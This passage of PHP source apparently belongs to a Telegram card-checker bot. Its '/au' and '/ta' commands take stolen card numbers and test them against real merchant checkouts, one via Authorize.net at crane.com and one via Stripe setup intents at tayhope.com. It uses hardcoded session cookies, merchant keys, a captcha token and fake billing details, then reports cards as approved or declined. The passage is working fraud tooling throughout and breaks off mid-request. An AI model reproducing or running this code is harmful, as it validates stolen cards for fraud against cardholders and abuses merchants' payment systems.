    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree_CCN (rec)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree_CCN (rec)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Braintree_CCN (rec)\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}

elseif((strpos($message, "!au") === 0)||(strpos($message, "/au") === 0)||(strpos($message, ".au") === 0)){
$lista = substr($message, 4);

$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];
$bin = substr($lista, 0, 6);
$date = "$mes$ano";

$bin = substr($lista, 0, 6);

//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /au CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}



//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//

$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api2.authorize.net/xml/v1/request.api',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"securePaymentContainerRequest":{"merchantAuthentication":{"name":"8JHG4sz2K","clientKey":"8df5becJ36r8cCupJe5c4Gpp7B7gKUEK4Z558rV88MSzMqpJ2B8q8AGr2hVEqx6u"},"clientId":"accept-ui-v3","data":{"type":"TOKEN","id":"56969a1d-3044-e77c-f0f8-5d5f9ef44e5d","token":{"cardNumber":"'.$cc.'","expirationDate":"'.$date.'","cardCode":"'.$cvv.'"}}}}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'Content-Type: application/json; charset=UTF-8',
    'sec-ch-ua-mobile: ?1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.6',
    'Origin: https://js.authorize.net',
    'Sec-Fetch-Site: same-site',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://js.authorize.net/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
preg_match('/"dataValue":"([^"]+)"/', $response, $match);
$id = $match[1];
curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://m2.crane.com/rest/V1/guest-carts/eUlwOllHIXA3xZpxbpL5zHHm6z9LD2iw/payment-information',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"email":"Dausitherer@cuvox.de","cartId":"eUlwOllHIXA3xZpxbpL5zHHm6z9LD2iw","billingAddress":{"region_id":"4","country_id":"US","street":["6195 bollinger rd"],"postcode":"10010","city":"New york","telephone":"(417) 920-4022","firstname":"Carlos","lastname":"Perez"},"paymentMethod":{"method":"authnetcim","additional_data":{"acceptjs_key":"COMMON.ACCEPT.INAPP.PAYMENT","acceptjs_value":"'.$id.'"}},"comments":""}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.6',
    'origin: https://www.crane.com',
    'sec-fetch-site: same-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://www.crane.com/',
    'priority: u=1, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$respo = $json["message"];
curl_close($curl);

echo "$respo\n";

if(empty($respo)){
$respo = $response;
}


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Authorize AVS\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction has been declined.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Authorize AVS\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Authorize AVS\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chat_id, $respuesta, $id_text);
} else {
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}



elseif((strpos($message, "!ta") === 0)||(strpos($message, "/ta") === 0)||(strpos($message, ".ta") === 0)){

$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);

$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//


//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /ta CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//



$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}


$cc = implode('+', $partes);

$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com/my-account/add-payment-method/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2F; woocommerce_items_in_cart=1',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'accept-language: es-US,es;q=0.9',
    'sec-ch-ua-platform: "Android"',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
// Extraer nonce
$patron_nonce = '/"createAndConfirmSetupIntentNonce":"([^"]*)"/';
preg_match($patron_nonce, $response, $matches_nonce);
$nonce = $matches_nonce[1];
curl_close($curl);


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Fa3221739cb%3B+stripe-js-v3%2Fa3221739cb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftayhope.com&time_on_page=32394&client_attribution_metadata%5Bclient_session_id%5D=8c405d81-87ee-4878-903c-8197346734a2&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=79b6db38-13c2-4b80-9428-9d00a6cea8d23a2bca&muid=f87acd8c-3c42-492d-a089-d786e071117723820f&sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954&key=pk_live_51PRDRyRu0O8mp73n3o0HQHdi68URnbYQVlBpDv1iGSlngWgApN1jmzay2cuYC5gZlO0MFZKg3UyaLKPS54vnWSjF001pzrXQWc&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZXJMdVJoeHJHcFVnTVF5NEVsVzdwWG1CVFpQOGJVazNrY2g0OUNVcFNydUxjZ29sZTFLNEZyVER1b1ZKRXpPRThpQkxkb3plT3ZIWWNRbTR6SE81NllqVnJVd1hieHkyckUzWmtGQmpKcHIyMXg1T2xjM3R0NDRtd29TOFBVY2h1NTkvQ1JXeC94ZmFyVHFtUDc0QTZic1RXdDhUWVpma3JFa2xQN2xBVEp1ZDM4eGhmOGFYcUZEU3VYOS9NdGc0T2VVdW5xSE1RNWRRM0w0ZlJFMWlEd3prQ3ZnQnRoTFM5WjhrMGhHelM1R3lzQ0Y5UllBRXVYK0k5dk91eGE4ZGMvSEExZ0Njd0Z2Q015czltaUVYeGdRaTY0Z0xTcE5WNjAxVUZpS05kUmJMU1V6RFl1dkowSzhxUDdsZ3FGdHZIdU9uUGZ5S0Vkd1FKQXlyYlBBL3VjQyswZWd6S1FKOXBiYlorNlhhUk9ibllaSzRLSnBHVGFRd3JTTW90cDZrLytlQXpvbWkyVEwyT0JKNHliWnQxdVFpU3c0akNlMk5wcU5jTVN1RWlES1dzd2hkYnVkTXZNc2ZIRVQ5T1dlMG5DdndnN1AwMXFVSmt1WWE5ZXhmd3hZSXdKZUpteVhBbnJ5bUM2RkhEaWp5Tml0OE41N3FoclpBQ1NNQXZ3QzcwOFk5d1hobHBKV1BTUXZvRUNpZ3llWUNCQ2dNOE0zTElJSit0SzNwUiszWWRaVlV4Z1NSVWxRajJnVlYwYlJGSVN0RlRjZHFzU0xhWXd3N1hzVzJYRk9DKzJSMHJCMnZidUloZXBBRm9JWVZLWHdnb0FDK0U4ZUZLV1Jld2ZoMExNcG45OWhETDZDcVIyREdwZWVvTzYwQzJiZ2dKbFJhbnRxUEg2WFhGZUR3YWRaTWRaS3ZIcmo4MUgrQ2llanMyWWxqYThXNXYxY3c0QTdWRXRSRlBrZ29KSzVQenEyOWo0Q2RaMEtheWVTV0FpV3VEMUd6WG1haEU0NjI2WVN2ZjcrYWdKSDZldDRVV2ZOYUI5SkQwcVRSVlhMSzYyT212QitLYlpyOERoVFA1R0c3TUt1TmxTN0tIdG9OUXVTekxzdldrRUJWQnEydTlqMTZyeEpIN2JWSXlwM1hFczNxbHRQd09mUjg3YVBDNERJNWx6QzdldDNQVEQ4a0VkSDdoejlxQmxDYlY3L09CVXpaa3ZKOEJ4OVJPWDlDWUNsQklFczZHbndFM3JSVjgvRzUvZXZUbHo4c1pQcTBTR1EvZ3dlbkZqL2xySU9TZmNoSUJZMzRvWUhVM0Jnc3BMVy95K1JXVzZLbnBrYmdXaVRrNmdnRVZrZ1NmWDcreTNKZE9nYm1sbWRtTkhGRW9ock41b284cFhzd2QyQWdaWFB6UDVzSmNLWS81bnJ3dklNVklRYjlVR2E0eUszMVl4WXgyUndQTVRvVjlUd3hQbDdzY0wrTVJTeXhMd0NINHlLU1hGZVVkQzB3OTJ2RFZzK2tJaUVRYTVqZjd3bnppWUVDcTU0U0I4ekVGS01DN0U4LzhqOFF2Vi8yTjN5R0FDNHV4dWVoMjNZajRZN28xd1Y3WmxEcDh0dDV3Nk9xLzdBQjVkcTREZmdUY2xZMmJuRGJHb0h3V2tMeGJWTG9hSFdxWm9aUFlJWmFEL0FUWHJ2MGVtSkdsa0h1OHk5YzRuWFI5cVlPWXJlZXEvd2NIbFlhRTJnaXIxT3V1OEF6TWVwZjNoZ1NObXZrVjZic1BhNHlNUHpIREdPMEI3VjVzbm41UU5RdFoyeDM5ZnY2VitIOXFpY2VDVnI1SEE0aEFpa05abjBlQWNUcFNmdDJmZWNSL2ZEZGtQWG0vYTZRVHJmRDVZOTExdEV2Z045cmhIYjZrQ0dBY0QyaFRUbVhONlBnMlJvYkFsSmZ0SWY1ZTlWeXhkc2NKd2l5cG5RT0t2RW9hcDRrcXg2L1lIKy9HVDlIL01PWXY3S3JrM3lWTnhLSGw3V2ZXOTJVVVpvTGxZaUVBczJHd2h4bVdxQzRXbEY2bjNHRFgxa0IyQXdCMlQzOWtiTG5TNnpPQjBFWnR1Zm01eVdwY0dJcjdXUXdKRk5TcU9qS24xbTZRM3c0OWdkaVRsK1BIN0RPMmFiRVdhejZGOGdjck1kT3RvajJGZStMbE1uZkJJcDY3dHlJZ2hHdHRrVjNjVHFMWm50Wk9yZkVYYkRwMW8yVHFsZkJXRkRXLzZiMGZ4MEM1YWJMNUVOa0hISk5wY1RaZHgyd3RFeTVRaHR6NURORDZtYTNSYmVudDIyL1hxLzBYWUZJTmhIZ2JzclVpUnRDR3hoM1QxVTcrd0g2K3l0V1o5N2J6YlpOMzlDVmZOU25Xem1XcVAvR2tYeWdtYWQvRzlvNzdXd2w3QkNUeFR3ZzJjM1JobmJUMkl3OGFGRlBaUng5dEkvdldGN2xac3FlNkpBMVRyQm9iM054TDhtaVVoYkhOazVxZkZHN1JYSWxzM2tWMkZTQlBCMTZjaFNKNVZhdVBFREFydER2RUI2d08xY1oxTzlUYVE1bG1nTmFZZzBXZ3FDZ3lsTzN5MTA4bVFleEFLYVU0QS9jMWpnYTZBUkhqb0ZQWXVBcFIySEhRYW92ZEZzMWpUVUZrc21ZTTYwYUlqeUZrb3IwbW82NElqM0tveHR0SEczYmgzWW80SWQrTkhtR3hZOUd3Z0dEMjdwald5dk5wZndaRkNaMzJDUTkzQkhvTlo5SEZCK0ZRMUpaWVpBb29BZ0xBaXd0ZEZiZUgvUXJKcGNYbURxV1h3PT0iLCJleHAiOjE3MzE3OTkzMDQsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMWZmMDllMmQiLCJwZCI6MCwiY2RhdGEiOiJIbWxnbHpWaTRiUjUxaUhhSjM1Z0ZtRUNuN1ZXSTVIRXYrUVovY1NCMXZKNVZmVWNQSHFzYUJuNmZGYUVRTXdqU3h0OFJjVUttWjF1aUl0TTZyNTV4RVdaWjdycGFBMEZIck9QL1FuenF1bXplQjUzNTYvTytnN2ZvWmZrN1FKbGwzOTdvbmt6SGVQQnJzdlJFN1BBbWcxamp2YWpDdnpZbDVmUDUyWHQ5RnN4Sk1HY3N4RzgrMUVWaUVYaExpVEVHOVVmYmZyU3dhcUkyWlArIn0.Fja1qIx2qx8Y4OqICzg1kr4YgH6kX0UYl1XYACNkOIE',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://tayhope.com',
    'referer: https://tayhope.com/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅!";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; 